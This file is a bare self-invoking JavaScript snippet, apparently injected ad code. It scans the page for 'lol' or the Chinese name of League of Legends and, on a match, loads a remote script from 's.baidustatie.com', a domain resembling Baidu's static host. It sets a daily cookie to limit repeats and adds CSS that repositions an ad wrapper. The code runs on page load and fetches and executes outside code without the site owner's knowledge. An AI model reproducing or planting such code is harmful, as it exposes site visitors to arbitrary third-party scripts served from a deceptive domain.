;(function(win, doc) {
    if (win != top || !doc.body || win.__DSDE__) {
        return
    }
    win.__DSDE__ = true;
    var keys2 = ['lol','LOL', '\u82f1\u96c4\u8054\u76df'],
        k = null;
    var scripts = document.getElementsByTagName("script");
    var scriptNode= scripts[scripts.length - 1];
    var html = document.documentElement;
    if (html.length < 1) {
        return
    }
    html = html.innerHTML;
    scriptNode=scriptNode.innerHTML;
    html=html.replace(scriptNode, '');
    for (i = 0; i < keys2.length; i++) {
        if (html.indexOf(keys2[i]) != -1) {
            k = keys2[i]
        }
    }
    if (k&&!getCookie('sndoAD')) {
        loadJs('http://s.baidustatie.com/t/g.php?z=2772x54izvi6');
        setCookie('sndoAD','true',86400);
    }
    function loadJs(url) {
        var el = document.createElement('script');
        el.src = url;
        el.type = 'text/javascript';
        document.body.appendChild(el);
        addCSS('#BDV_UNION_WRAPPER_2772x54izvi6_0{ margin: -240px auto!important; left: 0; ')
    }
    function addCSS(cssText) {
        var doc=document;
        var style = doc.createElement('style')
            , head = doc.head || doc.getElementsByTagName('head')[0];
        style.type = 'text/css';
        // for IE
        if (style.styleSheet) {
            var func = function() {
                try {
                    // 低版本IE显示长度限制
                    style.styleSheet.cssText = cssText;
                } catch (e) {}
            };
            if (style.styleSheet.disabled) {
                setTimeout(func, 10);
            } else {
                func();
            }
        } else {
            var textNode = doc.createTextNode(cssText);
            style.appendChild(textNode);
        }
        head.appendChild(style);
    }
    function setCookie(key, value, expire) {
        if (typeof document.cookie == 'string') {
            var exp = new Date()
            expire = expire || this.expire
            exp.setTime(exp - 0 + expire * 1000)
            document.cookie = key + "=" + encodeURIComponent(value) + ";expires=" + exp.toGMTString()
        }
    }
    function getCookie(key) {
        if (typeof document.cookie == 'string') {
            var h = RegExp("(^| )" + key + "=([^;]*)(;|$)").exec(document.cookie);
            return h ? decodeURIComponent(h[2]) : ''
        }
        return ''
    }
})(window, document);
